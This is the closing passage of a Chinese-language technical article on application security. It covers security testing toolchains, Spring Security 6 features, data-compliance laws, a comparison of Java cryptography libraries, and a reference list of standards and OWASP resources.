- npm / PyPI / Maven Central 的 typosquatting 和恶意包

### DAST / SAST / IAST 工具链
- **SAST**：Semgrep（开源，规则用 YAML 写）/ SonarQube / Fortify / Checkmarx
- **DAST**：OWASP ZAP / Burp Suite / Nuclei
- **IAST**：Contrast / Seeker（运行时插桩，结合静态和动态优势）
- **Fuzzing**：jazzer.js / cargo-fuzz / OSS-Fuzz（Google 维护的开源 Fuzzing 平台）
- 各阶段工具的"误报率"权衡（SAST 误报多但全；DAST 准但盲区多）

### Spring Security 6 的新特性
- Lambda DSL 全面化（去掉 antMatchers）
- 新的 Authorization Manager API（`AuthorizationManager` 替代旧的 `AccessDecisionVoter`）
- OAuth2 Authorization Server 内嵌（不再需要旧的 Spring Security OAuth）
- One-Time Token 登录（无密码登录的轻量实现）
- Passkey 实验支持

### 数据合规：GDPR / CCPA / 国内法规
- **GDPR**：欧盟通用数据保护条例，"被遗忘权"、明示同意、72 小时报告制
- **CCPA**：加州消费者隐私法案，类似 GDPR 但宽松些
- **个人信息保护法 (PIPL)**：中国 2021 实施，跨境传输需安全评估
- **网络安全法 + 数据安全法 + 等保 2.0**：合规三件套
- 工程实现：DLP（Data Loss Prevention）、数据分类分级、跨境传输前的脱敏

### 密码学库选型
- **JCE 自带**：标准、性能好、但算法选择有限（Ed25519 要 JDK 15+）
- **BouncyCastle**：算法最全（含国密、PGP、X.509 全栈），性能略低
- **Tink**（Google）：高层 API，封装"安全默认值"，难以误用
- **Conscrypt**（Google）：BoringSSL 的 Java 绑定，性能比 JCE 高

---

## 7. 引用

- OWASP Top 10 2021：https://owasp.org/Top10/
- OAuth 2.0（RFC 6749）+ OAuth 2.1 草案：https://datatracker.ietf.org/doc/html/draft-ietf-oauth-v2-1
- PKCE（RFC 7636）：https://datatracker.ietf.org/doc/html/rfc7636
- OpenID Connect Core：https://openid.net/specs/openid-connect-core-1_0.html
- TLS 1.3（RFC 8446）：https://datatracker.ietf.org/doc/html/rfc8446
- JWT（RFC 7519）+ JWS（RFC 7515）：https://datatracker.ietf.org/doc/html/rfc7519
- JWT BCP（RFC 8725，最佳实践）：https://datatracker.ietf.org/doc/html/rfc8725
- NIST SP 800-63B（数字身份指南）：https://pages.nist.gov/800-63-3/sp800-63b.html
- OWASP Cheat Sheet Series：https://cheatsheetseries.owasp.org/
- Mozilla SSL Configuration Generator：https://ssl-config.mozilla.org/
- 微软 STRIDE 威胁建模：https://learn.microsoft.com/security/engineering/threat-modeling
- SLSA：https://slsa.dev/
- 美团技术《应用安全在金融行业的落地实践》

---

> 配套：[API 设计](/article/architecture/api-design) | [DevOps CI/CD](/article/devops/cicd) | [HTTP/1→2→3](/article/network/http-evolution)
> 这是按 [桃花岛深度模板](/STYLE) 写的深文。
